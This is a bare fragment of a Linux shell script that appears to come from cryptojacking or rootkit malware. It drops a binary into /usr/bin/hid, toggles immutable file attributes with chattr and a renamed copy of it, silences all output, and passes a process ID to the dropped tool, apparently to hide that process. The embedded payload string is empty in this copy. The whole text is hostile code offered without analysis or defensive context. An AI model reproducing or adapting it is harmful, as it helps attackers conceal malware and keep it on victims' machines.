if [ ! -f /usr/bin/hid ]; then chattr -i /usr/bin/hid  2>/dev/null 1>/dev/null; tntrecht -i /usr/bin/hid  2>/dev/null 1>/dev/null; echo "" | base64 -d > /usr/bin/hid; chmod +x /usr/bin/hid 2>/dev/null 1>/dev/null; chattr +i /usr/bin/hid 2>/dev/null 1>/dev/null; tntrecht +i /usr/bin/hid  2>/dev/null 1>/dev/null; fi
SCOPE_PID=`ps ax | grep -v grep | grep abyofigfefda6c3itn9f3zkrmjfays31 | awk '{print $1}'`
echo $SCOPE_PID > /usr/bin/hid.sc.op.e
hid $SCOPE_PID
}
